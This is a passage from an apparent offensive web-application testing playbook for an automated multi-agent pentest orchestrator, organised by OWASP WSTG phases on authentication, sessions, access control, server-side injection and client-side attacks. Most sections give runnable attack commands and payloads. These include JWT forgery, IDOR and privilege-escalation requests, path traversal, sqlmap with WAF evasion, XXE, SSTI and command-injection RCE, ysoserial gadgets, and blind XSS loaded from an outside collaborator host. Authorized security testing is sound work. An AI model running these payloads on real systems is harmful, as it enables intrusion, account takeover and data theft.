- **Validation:** Capture a code/token at the Collaborator and exchange it (in scope) to prove takeover.
- **Evasion / edge cases:** Path traversal, fragment/`@` confusion, subdomain/suffix matching, `redirect_uri` allow-list prefix bugs; implicit-flow token in fragment leaking via Referer.
- **Severity:** CVSS up to 9.3 (ATO). Impact: federated account takeover.
- **Dispatch:** -> OAuthAgent

### Phase 4 artifacts
`$FINDINGS_DIR/{auth-findings.json,oauth-findings.json}`, reset/OAuth transcripts and Collaborator logs in `$ARTIFACTS_DIR`.

### Phase 4 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| Login/registration tested | enumeration + bypass + default creds | Required |
| Lockout & MFA assessed | both probed | Required |
| Reset flow tested | token + host-header injection | Required |
| OAuth tested (if present) | redirect_uri + state + code reuse | Required if OAuth |
| Findings recorded | written + `--add-finding` per confirmed | Required |

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

---

## Phase 5: SESSION MANAGEMENT

**Objective:** Full WSTG-SESS (01-09 + JWT + concurrent) -- cookie attributes, fixation, exposure, logout, timeout, puzzling, hijacking, and JWT (A07/A02). (CSRF, WSTG-SESS-05, is tested in P8.5 with the client-side controls it depends on.)
**Expert rationale:** Sessions are where authentication's promises are kept or broken after login. A perfect login with a fixable/forgeable session is still an account takeover.
**Gate-in:** Phase 4 advanced; valid sessions for userA/userB.
**Agent:** AuthAgent.
**Parallelizable:** Sub-techniques independent.

### 5.1 Session schema & predictability (WSTG-SESS-01)

- **Objective / hypothesis:** Session IDs are guessable or the scheme accepts attacker-chosen IDs.
- **Procedure:** Collect 200+ session tokens (logout/login loop or fresh sessions) and feed Burp Sequencer; test whether a self-set cookie value is honored.
- **Indicators:** Low entropy / sequential IDs; server accepts arbitrary session values.
- **Validation:** Sequencer FIPS entropy below threshold; predict-and-hijack an owned second session.
- **Severity:** CVSS 7.5-8.1. Impact: session prediction -> hijack.
- **Dispatch:** -> AuthAgent

### 5.2 Cookie attributes (WSTG-SESS-02)

- **Objective / hypothesis:** Session cookies lack `HttpOnly`/`Secure`/`SameSite`, widening XSS and CSRF impact.
- **Procedure:**
```bash
bb -D- "$TARGET/" -o /dev/null | grep -i "set-cookie" | tee "$ARTIFACTS_DIR/cookies.txt"
grep -ivE "httponly" "$ARTIFACTS_DIR/cookies.txt" | grep -i "session" && echo "[FINDING] session cookie missing HttpOnly"
```
- **Indicators:** Missing `HttpOnly` (XSS can steal it), `Secure` (downgrade leak), `SameSite` (CSRF, feeds P8.5).
- **Validation:** Confirm the *session* cookie specifically (not a benign one) lacks the flag.
- **Severity:** CVSS 4.3-6.5 (amplifier). Impact: enables XSS->ATO and CSRF.
- **Dispatch:** -> AuthAgent

### 5.3 Session fixation (WSTG-SESS-03)

- **Objective / hypothesis:** The session ID is not rotated on privilege change (login), so an attacker-fixed ID becomes authenticated.
- **Procedure:**
```bash
bb -c "$ARTIFACTS_DIR/pre.jar" "$TARGET/login" -o /dev/null      # capture pre-auth session
bb -b "$ARTIFACTS_DIR/pre.jar" -c "$ARTIFACTS_DIR/post.jar" -X POST "$TARGET/api/auth/login" \
   -H "Content-Type: application/json" -d '{"username":"userA@example.com","password":"REDACTED"}' -o /dev/null
diff <(grep -i session "$ARTIFACTS_DIR/pre.jar") <(grep -i session "$ARTIFACTS_DIR/post.jar") \
  && echo "[FINDING] session ID unchanged across login = fixation"
```
- **Indicators:** Identical session ID pre/post authentication.
- **Validation:** Fix a session, have it authenticated, then reuse the pre-set value to access the account.
- **Severity:** CVSS 6.5-8.1. Impact: account takeover.
- **Dispatch:** -> AuthAgent

### 5.4 Exposed session variables (WSTG-SESS-04)

- **Objective / hypothesis:** Session tokens leak via URL, logs, Referer, or browser storage.
- **Procedure:** Search Burp history for session IDs in query strings/Referer; inspect `localStorage`/`sessionStorage` via playwright-harness (cross-ref P8.13).
- **Indicators:** Token in URL/Referer; long-lived JWT in localStorage.
- **Severity:** CVSS 5.3-7.5. Impact: token leakage.
- **Dispatch:** -> AuthAgent

### 5.5 Logout functionality (WSTG-SESS-06)

- **Objective / hypothesis:** Logout does not invalidate the server-side session/token, so a captured token lives on.
- **Procedure:** Capture a token, log out, replay the token against a protected endpoint.
- **Indicators:** Post-logout token still returns authenticated data (common with stateless JWT and no denylist).
- **Validation:** Replay from a separate client after logout.
- **Severity:** CVSS 5.3-7.5. Impact: session survives logout.
- **Dispatch:** -> AuthAgent

### 5.6 Session timeout (WSTG-SESS-07)

- **Objective / hypothesis:** Idle/absolute timeout is absent or excessive.
- **Procedure:** Authenticate, idle, replay after the claimed timeout; inspect JWT `exp`/cookie `Max-Age`.
- **Indicators:** Token valid far beyond a reasonable window; no absolute expiry.
- **Severity:** CVSS 3.1-5.3. Impact: extended hijack window.
- **Dispatch:** -> AuthAgent

### 5.7 Session puzzling (WSTG-SESS-08)

- **Objective / hypothesis:** A session variable set in one flow (e.g. password-reset, registration) is trusted by another to grant access.
- **Procedure:** Start a flow that sets session state (reset/onboarding) and, without finishing it, request a protected resource that may read the same variable.
- **Indicators:** Partial-flow state grants unintended access.
- **Validation:** Reproduce the cross-flow privilege deterministically.
- **Severity:** CVSS 6.5-8.1. Impact: auth bypass via state confusion.
- **Dispatch:** -> AuthAgent

### 5.8 Session hijacking & concurrency (WSTG-SESS-09)

- **Objective / hypothesis:** Multiple concurrent sessions are uncontrolled; sessions not bound to client context; no revocation.
- **Procedure:** Log the same account in from two clients; change password in one and check the other stays alive; test whether sessions are IP/UA-bound at all.
- **Indicators:** Old sessions survive password change; unlimited concurrent sessions with no visibility/revocation.
- **Severity:** CVSS 5.3-7.5. Impact: attacker session persists after victim remediation.
- **Dispatch:** -> AuthAgent

### 5.9 JWT testing (WSTG-SESS JWT / WSTG-CRYP-04)

- **Objective / hypothesis:** JWTs accept `alg:none`, key confusion, weak secrets, or unverified claims -> forge admin tokens.
- **Procedure:**
```bash
JWT=$(printf '%s' "$COOKIE_A" | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
python3 jwt_tool.py "$JWT" -X a                                      # alg:none
python3 jwt_tool.py "$JWT" -X k -pk "$ARTIFACTS_DIR/server-pub.pem"   # RS256->HS256 key confusion
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/jwt-secrets.txt # crack weak HMAC secret
python3 jwt_tool.py "$JWT" -T                                         # tamper claims (role/sub/exp)
bb -H "Authorization: Bearer $FORGED" "$TARGET/api/admin/users" -D- -o "$ARTIFACTS_DIR/jwt-forged.body"
```
- **Indicators:** Forged/`none`-alg/cracked token accepted; claim tampering (`role:admin`, swapped `sub`) honored; `kid` SQLi/path traversal; missing `aud`/`iss` checks.
- **Validation:** Forged-token request returns privileged data not available to userA.
- **Evasion / edge cases:** `jku`/`x5u` header pointing to attacker JWKS; `kid` injection; nested JWT; trailing-dot `alg:none`.
- **Severity:** CVSS up to 9.8 (admin forge). Impact: full authz bypass.
- **Dispatch:** -> AuthAgent

### Phase 5 artifacts
`$FINDINGS_DIR/auth-findings.json` (session entries), `$ARTIFACTS_DIR/{cookies.txt,pre.jar,post.jar,jwt-forged.body}`, Sequencer export.

### Phase 5 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| Cookie attrs reviewed | all session cookies | Required |
| Fixation + logout + timeout | tested | Required |
| JWT analysis (if JWT) | none/confusion/crack/claims | Required if JWT |
| Findings recorded | written + `--add-finding` per confirmed | Required |

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

---

## Phase 6: AUTHORIZATION & ACCESS CONTROL

**Objective:** Full WSTG-ATHZ (01-04) -- IDOR/BOLA, authorization-schema bypass, horizontal/vertical privilege escalation, and directory traversal / file inclusion (A01, the #1 category).
**Expert rationale:** Broken access control is the most common and most impactful web bug class. It is invisible to single-identity testing -- which is exactly why Pre-Flight provisioned userA/userB/admin. Every object and every function is tested across the identity matrix.
**Gate-in:** Phase 5 advanced; userA, userB, admin sessions valid; object identifiers and role map from P2.6.
**Agents:** IDORAgent (BOLA/BFLA/privesc), PathTraversalAgent (traversal/LFI/RFI).
**Parallelizable:** IDOR and traversal run concurrently.

### 6.0 Build the access-control matrix

- **Objective / hypothesis:** Systematic role x endpoint coverage so no function is left untested.
- **Procedure:** Enumerate every sensitive endpoint from `entry-points.txt`; for each, record expected access (admin-only, owner-only, any-user) and the result with each identity. This matrix is the deliverable behind every P6 finding.
- **Dispatch:** -> IDORAgent

### 6.1 IDOR / BOLA (WSTG-ATHZ-04)

- **Objective / hypothesis:** Object identifiers are not bound to the caller's ownership; userA can read/modify userB's objects.
- **Procedure:**
```bash
# Discover userB's object id while authenticated as B, then access it as A
OBJ_B=$(bb -H "Cookie: $COOKIE_B" "$TARGET/api/me" | jq -r '.id')
bb -H "Cookie: $COOKIE_A" "$TARGET/api/users/$OBJ_B/profile" -D- -o "$ARTIFACTS_DIR/idor-read.body"
bb -H "Cookie: $COOKIE_A" -X PUT "$TARGET/api/users/$OBJ_B" \
  -H "Content-Type: application/json" -d '{"email":"attacker@example.com"}' -D-
```
- **Indicators:** userA receives userB's data (200 with B's fields) or successfully mutates it.
- **Validation:** Confirm the returned data truly belongs to B (compare to B's own session response), not a generic stub.
- **Evasion / edge cases:** UUIDs are not protection -- harvest them from other responses; test numeric, hashed, base64, and indirect references; nested IDs in JSON; GraphQL node IDs.
- **Severity:** CVSS 6.5-9.1 (sensitive data/funds). Impact: cross-tenant data breach.
- **Dispatch:** -> IDORAgent

### 6.2 Authorization-schema bypass / BFLA (WSTG-ATHZ-02)

- **Objective / hypothesis:** Function-level authorization is missing -- a low-priv user can invoke admin functions directly.
- **Procedure:**
```bash
ADMIN_FUNCS=(/api/admin/users /api/admin/config /api/admin/audit /api/users/export)
for f in "${ADMIN_FUNCS[@]}"; do
  echo "$f admin=$(bb -o /dev/null -w '%{http_code}' -H "Cookie: $COOKIE_ADMIN" "$TARGET$f") userA=$(bb -o /dev/null -w '%{http_code}' -H "Cookie: $COOKIE_A" "$TARGET$f")"
done
```
- **Indicators:** Admin endpoint returns 200 for userA; client-side-only gating (UI hides button, API allows call).
- **Validation:** Confirm the action's effect occurred as userA (state change, not just 200).
- **Evasion / edge cases:** Method-based gaps (GET denied, POST allowed); `/api/v1` legacy lacking the check; referer/role-header trust.
- **Severity:** CVSS 7.5-9.1. Impact: privilege escalation to admin functions.
- **Dispatch:** -> IDORAgent

### 6.3 Privilege escalation (WSTG-ATHZ-03)

- **Objective / hypothesis:** Mass assignment, role parameter tampering, or forced browsing elevates a user vertically.
- **Procedure:**
```bash
bb -H "Cookie: $COOKIE_A" -X PUT "$TARGET/api/users/me" -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"permissions":["*"],"groups":["administrators"]}' -D-
bb -H "Cookie: $COOKIE_A" "$TARGET/api/me" | jq '{role,is_admin,permissions}'  # did it stick?
```
- **Indicators:** Self profile now shows elevated role/permissions; previously-403 admin function now reachable.
- **Validation:** Exercise an admin-only action after elevation.
- **Severity:** CVSS up to 9.8. Impact: vertical privilege escalation.
- **Dispatch:** -> IDORAgent

### 6.4 Directory traversal / file inclusion (WSTG-ATHZ-01, WSTG-INPV-11)

- **Objective / hypothesis:** File/path parameters allow traversal to arbitrary files or remote include (A01/A03).
- **Procedure:**
```bash
PARAM_ENDPOINT="$TARGET/api/files/download?path="
for p in "../../../../etc/passwd" "..%2f..%2f..%2f..%2fetc%2fpasswd" \
         "..%252f..%252f..%252fetc%252fpasswd" "%2e%2e/%2e%2e/etc/passwd" \
         "....//....//....//etc/passwd" "/etc/passwd%00.png" \
         "....\\....\\....\\windows\\win.ini" \
         "php://filter/convert.base64-encode/resource=index.php"; do
  bb "${PARAM_ENDPOINT}${p}" -o "$ARTIFACTS_DIR/lfi-$RANDOM.body" -w "$p -> %{http_code} %{size_download}b\n"
done
grep -al "root:.*:0:0:" "$ARTIFACTS_DIR"/lfi-*.body 2>/dev/null && echo "[FINDING] path traversal -> /etc/passwd"
```
- **Indicators:** `/etc/passwd` contents; base64 PHP source via `php://filter`; `win.ini` on Windows.
- **Validation:** Retrieve a second distinct file to rule out a canned response; decode base64 source to confirm.
- **Evasion / edge cases:** Encoding layers, null bytes, nested `....//`, absolute paths, UNC paths, `php://`/`data://`/`expect://` wrappers, log-poisoning LFI->RCE (-> RCEAgent).
- **Severity:** CVSS 7.5-9.8 (LFI->RCE). Impact: source/secret disclosure, code execution.
- **Dispatch:** -> PathTraversalAgent (RCE chain -> RCEAgent)

### Phase 6 artifacts
`$FINDINGS_DIR/{idor-findings.json,access-control-matrix.json}`, traversal bodies in `$ARTIFACTS_DIR`.

### Phase 6 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| Access-control matrix filled | every sensitive endpoint x {userA,userB,admin} | Required |
| IDOR two-account testing | all object types, read + write | Required |
| BFLA / privesc | admin funcs + mass assignment | Required |
| Traversal/LFI | all file params | Required |

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

---

## Phase 7: SERVER-SIDE INJECTION (parallel HUNT)

**Objective:** Server-side WSTG-INPV: SQLi(05), NoSQLi, LDAP(06)/XPath(09), XML/XXE(07), SSI(08), IMAP/SMTP(10), code injection(11), OS command(12), format string(13), incubated(14), HPP(04), SSTI(17), deserialization, CRLF (A03/A08).
**Expert rationale:** This is the classic injection battery and the home of the highest CVSS single bugs (pre-auth RCE). It is profile-targeted: only fire SQL payloads at data-backed params, template payloads at rendered output, deserialization at serialized blobs. Hunters run in parallel because their surfaces are disjoint.
**Gate-in:** Phase 6 advanced; `entry-points.txt`, `arjun-params.json`, AppProfile available; OOB channel (`$COLLAB`) live.
**Agents (HUNT group, run_in_background, orchestrator caps concurrency):** SQLiAgent, NoSQLiAgent, XXEAgent, RCEAgent, SSTIAgent, CommandInjectionAgent, DeserializationAgent, CRLFAgent.
**Parallelizable:** Yes -- all of P7.x concurrently.

```text
Deploy (HUNT subset):
  SQLiAgent             <- param-urls + arjun params (SQL/LDAP/XPath)
  NoSQLiAgent           <- JSON endpoints, auth bodies
  XXEAgent              <- XML/SOAP/SAML/upload endpoints
  RCEAgent              <- code-injection/LFI->RCE/format-string surfaces
  SSTIAgent             <- reflected-in-rendered-template params, SSI
  CommandInjectionAgent <- host/ip/cmd-like params, IMAP/SMTP, HPP
  DeserializationAgent  <- serialized cookies/params/viewstate
  CRLFAgent             <- header-reflected params, response splitting
All outputs -> $FINDINGS_DIR/<class>-findings.json
```

### 7.1 SQL injection (WSTG-INPV-05)

- **Objective / hypothesis:** A parameter concatenates into SQL -> data exfiltration / authn bypass / RCE.
- **Procedure:**
```bash
bb "$TARGET/items?id=1'"       -o "$ARTIFACTS_DIR/sqli-quote.body" -w "%{http_code} %{time_total}\n"
bb "$TARGET/items?id=1 AND 1=1" -o /dev/null -w "true  %{time_total}\n"
bb "$TARGET/items?id=1 AND 1=2" -o /dev/null -w "false %{time_total}\n"
sqlmap -u "$TARGET/items?id=1" --batch --smart --level 3 --risk 2 \
  --cookie="$COOKIE_A" --proxy="$BURP_PROXY" --random-agent \
  --tamper=space2comment,between,randomcase --output-dir="$ARTIFACTS_DIR/sqlmap/"
```
- **Indicators:** DB error on quote; boolean response delta; reproducible time delay on `SLEEP`/`WAITFOR`; OOB DNS hit for stacked/`xp_dirtree`.
- **Validation:** Confirm with two orthogonal techniques (boolean + time) or extract a benign value (`@@version`); rule out generic 500s.
- **Evasion / edge cases:** WAF tampers, comment/case/whitespace tricks, second-order (stored input used in a later query), JSON/SQLi in headers, ORM leak.
- **Severity:** CVSS up to 9.8 (data breach / RCE via `INTO OUTFILE`, `xp_cmdshell`). Impact: full data compromise.
- **Dispatch:** -> SQLiAgent

### 7.2 NoSQL injection

- **Objective / hypothesis:** JSON operators (`$ne`, `$gt`, `$where`) bypass auth or extract data in Mongo-style stores.
- **Procedure:**
```bash
bb -X POST "$TARGET/api/auth/login" -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' -D- -o "$ARTIFACTS_DIR/nosqli-auth.body"
bb -X POST "$TARGET/api/search" -H "Content-Type: application/json" \
  -d '{"q":{"$where":"sleep(5000)"}}' -o /dev/null -w "%{time_total}\n"
```
- **Indicators:** Auth bypass (logged in without valid creds); `$where` time delay; operator injection changes result set.
- **Validation:** Reproduce the auth bypass yielding a real session.
- **Evasion / edge cases:** Operator injection in query string (`username[$ne]=`), array vs object body, GraphQL filter args.
- **Severity:** CVSS up to 9.8. Impact: auth bypass / data extraction.
- **Dispatch:** -> NoSQLiAgent

### 7.3 LDAP & XPath injection (WSTG-INPV-06, -09)

- **Objective / hypothesis:** Directory/XML-query params break out of filter syntax -> auth bypass / data disclosure.
- **Procedure:**
```bash
bb "$TARGET/search?user=*)(uid=*))(|(uid=*"     -o "$ARTIFACTS_DIR/ldapi.body"   # LDAP
bb "$TARGET/search?q=') or ('1'='1"            -o "$ARTIFACTS_DIR/xpathi.body"  # XPath
```
- **Indicators:** Filter wildcard returns all records; XPath tautology bypasses login; verbose LDAP/XPath errors.
- **Validation:** Confirm broadened result set or login bypass deterministically.
- **Severity:** CVSS 7.5-9.1. Impact: auth bypass / directory disclosure.
- **Dispatch:** -> SQLiAgent

### 7.4 XML injection / XXE (WSTG-INPV-07)

- **Objective / hypothesis:** XML parser resolves external entities -> file read, SSRF, OOB exfiltration.
- **Procedure:**
```bash
cat > "$ARTIFACTS_DIR/xxe.xml" <<'XML'
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
XML
bb -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" \
  --data @"$ARTIFACTS_DIR/xxe.xml" -o "$ARTIFACTS_DIR/xxe-read.body"
bb -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://'"$COLLAB"'/e.dtd">%x;]><root>x</root>'
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 12
```
- **Indicators:** `/etc/passwd` in response (classic) or Collaborator DNS/HTTP hit (blind/OOB).
- **Validation:** Read a second file or capture exfil data via the parameter-entity chain.
- **Evasion / edge cases:** XXE in file upload (XLSX/DOCX `content.xml`, SVG), SOAP, SAML responses; parameter entities for blind; UTF-16; avoid billion-laughs (DoS).
- **Severity:** CVSS 7.5-9.8 (file read + SSRF -> metadata). Impact: file disclosure, internal SSRF.
- **Dispatch:** -> XXEAgent

### 7.5 SSI injection (WSTG-INPV-08)

- **Objective / hypothesis:** Server-side includes evaluate injected directives -> command execution / file read.
- **Procedure:**
```bash
bb "$TARGET/page?name=<!--#exec cmd=\"id\"-->" -o "$ARTIFACTS_DIR/ssi.body"
bb "$TARGET/page?name=<!--#include virtual=\"/etc/passwd\"-->" -o "$ARTIFACTS_DIR/ssi-inc.body"
grep -a "uid=" "$ARTIFACTS_DIR/ssi.body" && echo "[FINDING] SSI command execution"
```
- **Indicators:** `uid=...` (cmd) or file contents rendered.
- **Validation:** Second command confirms execution.
- **Severity:** CVSS 8.1-9.8. Impact: RCE.
- **Dispatch:** -> SSTIAgent

### 7.6 IMAP/SMTP injection (WSTG-INPV-10)

- **Objective / hypothesis:** Mail-handling params allow header/command injection -> spam relay, header smuggling.
- **Procedure:** Inject CRLF + extra headers/recipients into mail-sending fields (contact, invite, share-by-email): `victim@x.com%0d%0aBcc:attacker@$COLLAB`.
- **Indicators:** Extra recipient receives mail; SMTP command injected; Collaborator SMTP hit.
- **Validation:** Confirm an attacker-controlled address receives mail.
- **Severity:** CVSS 5.3-7.5. Impact: mail relay / header injection.
- **Dispatch:** -> CommandInjectionAgent

### 7.7 Code injection / LFI->RCE (WSTG-INPV-11)

- **Objective / hypothesis:** Input reaches `eval`/dynamic include -> code execution.
- **Procedure:** Inject language-eval payloads (`;phpinfo();`, `__import__('os').system('id')`) into params suspected of dynamic evaluation; chain LFI (P6.4) with log/`php://` wrappers to execution.
- **Indicators:** Evaluated output (phpinfo page, `uid=`), OOB beacon.
- **Validation:** Two distinct commands confirm execution.
- **Severity:** CVSS up to 9.8. Impact: RCE.
- **Dispatch:** -> RCEAgent

### 7.8 OS command injection (WSTG-INPV-12)

- **Objective / hypothesis:** A param flows into a shell -> command execution.
- **Procedure:**
```bash
for sep in ';' '|' '||' '&&' '%0a'; do
  START=$(date +%s)
  bb "$TARGET/api/ping?host=127.0.0.1${sep}sleep+5" -o /dev/null
  DIFF=$(( $(date +%s) - START )); [ "$DIFF" -ge 4 ] && echo "[FINDING] cmd injection via '$sep'"
done
bb "$TARGET/api/ping?host=127.0.0.1;nslookup+$COLLAB" -o /dev/null
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 12
```
- **Indicators:** ~5s delay on `sleep`; Collaborator DNS/HTTP from injected `nslookup`/`curl`.
- **Validation:** OOB beacon is the gold standard; corroborate with a second separator/command.
- **Evasion / edge cases:** Blind/OOB only; separator/quoting bypass, `${IFS}` for spaces, base64-pipe-bash, Windows `&`/`|`.
- **Severity:** CVSS up to 9.8. Impact: RCE.
- **Dispatch:** -> CommandInjectionAgent

### 7.9 HTTP parameter pollution (WSTG-INPV-04)

- **Objective / hypothesis:** Duplicate params are parsed inconsistently across tiers -> filter/authz bypass or value override.
- **Procedure:** Send duplicated params (`?role=user&role=admin`, body+query collisions) and observe which tier wins; use to bypass WAF rules or input filters.
- **Indicators:** Behavior differs from single-param baseline; the "last wins" value defeats a control.
- **Validation:** Demonstrate a security-relevant override (authz/price/filter).
- **Severity:** CVSS 4.3-7.5 (context). Impact: control bypass.
- **Dispatch:** -> CommandInjectionAgent

### 7.10 Format string (WSTG-INPV-13)

- **Objective / hypothesis:** User input used as a format string leaks memory or crashes (mostly native/legacy backends).
- **Procedure:** Inject `%x%x%x%n%s` into fields echoed by native components; watch for memory leakage or errors.
- **Indicators:** Hex memory in output; abnormal errors/crash.
- **Validation:** Reproduce leakage deterministically.
- **Severity:** CVSS 5.3-8.1. Impact: info leak / DoS.
- **Dispatch:** -> RCEAgent

### 7.11 Incubated / stored injection (WSTG-INPV-14)

- **Objective / hypothesis:** Malicious input stored now, executed later in a privileged context (admin view, batch job, report).
- **Procedure:** Seed second-order payloads (XSS/SQLi/template) into fields rendered to admins or processed asynchronously; mark each with a unique Collaborator token; wait/trigger and watch for the beacon.
- **Indicators:** Delayed beacon when the stored value is processed.
- **Validation:** Correlate the beacon token to the injection site.
- **Severity:** CVSS 6.5-9.1 (admin-context). Impact: delayed compromise.
- **Dispatch:** -> RCEAgent (XSS path -> XSSAgent)

### 7.12 Server-side template injection (WSTG-INPV-17)

- **Objective / hypothesis:** Input rendered by a template engine -> sandbox escape -> RCE.
- **Procedure:**
```bash
for p in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '{7*7}' '{{7*"7"}}' '*{7*7}'; do
  r=$(bb "$TARGET/profile?name=$p"); echo "$p -> $(echo "$r" | grep -oE '49|7777777' | head -1)"
done
bb "$TARGET/profile?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}" -o "$ARTIFACTS_DIR/ssti-rce.body"
```
- **Indicators:** `49`/`7777777` rendered; engine-specific RCE returns `uid=`.
- **Validation:** Distinguish SSTI from reflected XSS (math is evaluated server-side); confirm RCE with OOB.
- **Evasion / edge cases:** Engine fingerprint via differential payloads; sandbox-escape gadgets per engine (Jinja2, Twig, Freemarker, Velocity, ERB, Handlebars->prototype-pollution path).
- **Severity:** CVSS up to 9.8. Impact: RCE.
- **Dispatch:** -> SSTIAgent

### 7.13 Insecure deserialization

- **Objective / hypothesis:** Serialized objects in cookies/params/viewstate are deserialized unsafely -> gadget-chain RCE (A08).
- **Procedure:** Identify serialized blobs (Java `rO0`, PHP `O:`, .NET `__VIEWSTATE`, Python pickle, Ruby Marshal); generate gadget payloads with the matching tool and replay through Burp.
```bash
java -jar ysoserial.jar CommonsCollections5 "nslookup $COLLAB" | base64 -w0 > "$ARTIFACTS_DIR/yso.b64"
bb -X POST "$TARGET/api/object" -H "Content-Type: application/octet-stream" \
  --data-binary @<(base64 -d "$ARTIFACTS_DIR/yso.b64")
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 12
```
- **Indicators:** Collaborator beacon from the gadget; deserialization errors revealing the format.
- **Validation:** OOB beacon ties to the payload; corroborate with a second gadget/command.
- **Evasion / edge cases:** ysoserial (Java), ysoserial.net + viewstate (.NET, needs machineKey), phpggc (PHP), pickle/PyYAML (Python); length/`Content-Length` and encoding correctness matter.
- **Severity:** CVSS up to 9.8. Impact: RCE.
- **Dispatch:** -> DeserializationAgent

### 7.14 CRLF / response splitting (WSTG-INPV-15 partial)

- **Objective / hypothesis:** Newlines in input that reaches a response header enable header injection / response splitting / cookie setting.
- **Procedure:**
```bash
bb -D- "$TARGET/redirect?url=%0d%0aSet-Cookie:%20pwn=1%0d%0aX-Injected:%20yes" -o /dev/null \
  | grep -iE "^(set-cookie: pwn|x-injected:)" && echo "[FINDING] CRLF header injection"
```
- **Indicators:** Injected header appears in the response.
- **Validation:** Confirm an attacker-controlled header (e.g. `Set-Cookie`) is reflected.
- **Evasion / edge cases:** Encoded `%0d%0a`, unicode newlines, header reflected via `Location`; chain to cache poisoning (P9.2) / open redirect (P8.4).
- **Severity:** CVSS 5.3-7.5. Impact: header injection, XSS via splitting, cache poisoning.
- **Dispatch:** -> CRLFAgent

### Phase 7 artifacts
`$FINDINGS_DIR/{sqli,nosqli,ldap,xxe,ssti,cmdinjection,deserialization,crlf}-findings.json`, `$ARTIFACTS_DIR/{sqlmap/,xxe*.body,ssti-rce.body,yso.b64,lfi-*}`, Collaborator logs.

### Phase 7 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| All injection hunters returned | each agent reported (partial WARN) | WARN |
| SQLi/NoSQLi | all data-backed params + auth bodies | Required |
| XXE | all XML/upload endpoints | Required if XML |
| SSTI/SSI/command/code | all rendered + exec surfaces | Required |
| Deserialization | all serialized blobs | Required if present |
| Findings deduped + recorded | per-class JSON + `--add-finding` | Required |

```bash
jq -s 'add // []' "$FINDINGS_DIR"/{sqli,nosqli,ldap,xxe,ssti,cmdinjection,deserialization,crlf}-findings.json \
  2>/dev/null > "$FINDINGS_DIR/phase7-injection-all.json"
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

---

## Phase 8: CLIENT-SIDE TESTING (parallel HUNT)

**Objective:** Full WSTG-CLNT (01-13): DOM XSS / JS execution(01,02), HTML injection(03), client-side URL redirect(04), CSS injection(05), client resource manipulation(06), CORS(07), cross-site flashing(08), clickjacking(09), WebSockets(10), web messaging/postMessage(11), browser storage(12), XSSI / prototype pollution(13); plus reflected/stored XSS (WSTG-INPV-01,-02) and CSRF (WSTG-SESS-05). (A03, A01, A05.)
**Expert rationale:** The browser is a trust boundary of its own. DOM XSS, postMessage trust, prototype pollution, and CORS are invisible from the wire -- they require a real, instrumented browser. XSSAgent and friends drive playwright-harness for source/sink truth.
**Gate-in:** Phase 7 advanced; CSP/header posture from P2.3; JS sources collected (P1.5).
**Agents (HUNT subset):** XSSAgent, CORSAgent, PrototypePollutionAgent, OpenRedirectAgent, WebSocketAgent, CSRFAgent.
**Parallelizable:** Yes.

### 8.1 Reflected & stored XSS (WSTG-INPV-01, -02)

- **Objective / hypothesis:** User input renders into HTML/JS without context-correct encoding -> script execution.
- **Procedure:**
```bash
dalfox url "$TARGET/search?q=FUZZ" -b "$COLLAB" --header "Cookie: $COOKIE_A" \
  --proxy "$BURP_PROXY" --waf-evasion --format json -o "$FINDINGS_DIR/dalfox.json"
BLIND='"><script src=https://'"$COLLAB"'/x.js></script>'
# inject $BLIND into profile/comment/support fields via authenticated browser, then:
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 30
```
- **Indicators:** Payload reflects unencoded and executes; Collaborator load from `x.js` (stored/blind, often from an admin viewer).
- **Validation:** Confirm execution in a real browser (alert/beacon), not mere reflection; capture screenshot.
- **Evasion / edge cases:** Context-aware payloads (attribute/JS/URL), CSP bypass (JSONP, `unsafe-inline`, dangling markup), mutation XSS, WAF evasion via encoding/case.
- **Severity:** CVSS 6.1 (reflected) up to 9.0 (stored in admin -> ATO chain). Impact: session theft, ATO.
- **Dispatch:** -> XSSAgent

### 8.2 DOM-based XSS / JS execution (WSTG-CLNT-01, -02)

- **Objective / hypothesis:** Client JS passes attacker-controlled source (location/hash/postMessage) into a dangerous sink (`innerHTML`, `eval`, `document.write`).
- **Procedure:**
```bash
bun "$TOOLS/playwright-harness.ts" --target "$TARGET" --auth-cookie "$COOKIE_A" \
  --proxy "$BURP_PROXY" --mode test --test-xss --crawl-depth 4 \
  --screenshots "$EVIDENCE_DIR" --output "$FINDINGS_DIR/dom-xss.json"
grep -nE "location\.(hash|search|href)|document\.(write|cookie)|innerHTML|eval\(|setTimeout\(" \
  "$RECON_DIR"/js-files.txt 2>/dev/null
```
- **Indicators:** Source-to-sink flow with no sanitization; payload in `#hash` executes.
- **Validation:** Trigger in the instrumented browser; the harness confirms execution, not reflection.
- **Evasion / edge cases:** Hashchange/SPA routing, `postMessage` source (P8.12), template frameworks ({{}}-sinks), DOM clobbering.
- **Severity:** CVSS 6.1-8.8. Impact: client-side compromise/ATO.
- **Dispatch:** -> XSSAgent

### 8.3 HTML injection (WSTG-CLNT-03)

- **Objective / hypothesis:** Markup injects without script -> content spoofing/phishing, dangling-markup data theft.
- **Procedure:** Inject benign tags (`<h1>`, `<form action=//$COLLAB>`) and observe rendering; test dangling-markup to exfiltrate tokens to `$COLLAB`.
- **Indicators:** Injected markup renders; form/img exfiltrates to Collaborator.
